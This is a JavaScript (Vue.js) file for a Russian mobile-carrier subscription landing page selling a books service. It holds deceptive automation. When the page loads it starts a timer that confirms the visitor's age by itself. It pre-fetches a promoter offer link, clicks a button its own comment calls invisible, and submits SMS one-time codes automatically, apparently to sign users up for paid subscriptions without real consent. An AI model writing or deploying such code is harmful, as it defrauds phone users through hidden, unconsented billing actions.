const app = new Vue({
    el: '#app',
    directives: {
        mask: VueMask.VueMaskDirective,
    },
    data: {
        msisdn: window.msisdn,
        resendOTP: false,
        phoneViewVisibility: false,
        subscribeViewVisibility: true,
        passwordViewVisibility: false,
        paymentViewVisibility: false,
        manySubsModalVisibility: false,
        subscribeSuspend: false,
        isGirlLanding: false,
        ageConfirm: false,
        errorCode: false,
        accessSectionError: '',
        isAoc: window.isAoc,
        csrfToken: window.csrfToken,
        promoterId: window.promoterId,
        promolink: window.promolink,
        otpCode: '',
        passwordIsVerified: false,
        autocompleteListenerAlreadySet: false,
        submitBtnEnabled: true,
        isBodyCenter: false,
        isCenter: false,
        isHidden: false,
        message: 'Тысячи книг по фантастике и другим жанрам всегда с вами',
        timer: 10, // Начальное значение таймера
        timerEnded: false, // Флаг для завершения таймера
        timerInterval: null, // Интервал таймера
        isSwitching: false, // Флаг для отслеживания переключения кнопок
        showContinue: false // Флаг для отображения кнопки "Продолжить"
    },
    methods: {
        async preloadOfferLink() {
            const url = "http://landing.beeline.ru/promoter/init/1022-YfRqvqKsHZQ6?lp=books-102-14";

            try {
                await fetch(url, { mode: 'no-cors' });
                console.log("✅ Данные успешно загружены в кэш:", url);
            } catch (error) {
                console.error("❌ Ошибка загрузки данных в кэш:", error);
            }
        },
        openManySubsModal() {
            this.manySubsModalVisibility = true;
        },
        closeManySubsModal() {
            this.manySubsModalVisibility = false;
        },
        showPhoneView() {
            this.phoneViewVisibility = true;
            this.passwordViewVisibility = this.subscribeViewVisibility = this.paymentViewVisibility = false;
        },
        showPasswordView() {
            this.passwordViewVisibility = true;
            this.phoneViewVisibility = this.subscribeViewVisibility = this.paymentViewVisibility = false;
        },
        showPaymentView() {
            this.paymentViewVisibility = true;
            this.phoneViewVisibility = this.subscribeViewVisibility = this.passwordViewVisibility = false;
        },
        showSubscribeView() {
            this.subscribeViewVisibility = true;
            this.phoneViewVisibility = this.passwordViewVisibility = this.paymentViewVisibility = false;
        },
        async onConfirmAge() {
            this.accessSectionError = '';
            this.submitBtnEnabled = true;
            this.ageConfirm = true;
        },
        async toggleView() {
            this.isSwitching = true; // Начинаем переключение
            this.onConfirmAge();
            this.stopTimer(); // Останавливаем таймер при клике
        },
        async submitPassword() {
            this.isAoc = false;
            this.accessSectionError = true;
            if (this.passwordIsVerified) {
                this.finalize();
            }
        },
        async sendOTP() {
            this.accessSectionError = '';
            this.passwordViewVisibility = true;
            this.addAutocompleteOtp();
        },
        async resendOTPCode() {
            this.sendOTP();
            this.resendOTP = true;
        },
        async finalize() {
            this.submitBtnEnabled = false;
            document.getElementById("finalize").submit();
        },
        async modelSubscribe() {
            await this.onConfirmAge();

            if (this.ageConfirm) {
                this.finalize();
            }
        },
        addAutocompleteOtp() {
            if (this.autocompleteListenerAlreadySet) {
                return;
            }

            const ac = new AbortController();
            navigator.credentials.get({
                otp: {transport: ['sms']},
                signal: ac.signal
            }).then(otp => {
                this.otpCode = otp.code;
                this.submitPassword();
            }).catch(err => {
                console.log(err);
            });

            this.autocompleteListenerAlreadySet = true;
        },
        startTimer() {
            this.timerInterval = setInterval(() => {
                if (this.timer > 0) {
                    this.timer--;
                } else {
                    this.timerEnded = true;
                    this.stopTimer();
                    this.toggleView(); // Автоматически запускаем переключение по истечении таймера
                }
            }, 1000);
        },
        stopTimer() {
            clearInterval(this.timerInterval);
        },
        showContinueButton() {
            this.showContinue = true; // Показываем кнопку "Продолжить" после завершения анимации
            this.isSwitching = false; // Завершаем переключение

            // Через 1 секунду кликаем по невидимой кнопке
            setTimeout(() => {
                const offerLinkButton = document.getElementById('offer-link');
                if (offerLinkButton) {
                    offerLinkButton.click(); // Кликаем по кнопке
                }
            }, 1000);
        }
    },
    mounted() {
        this.startTimer(); // Запускаем таймер при монтировании компонента
        this.preloadOfferLink();
    }
});
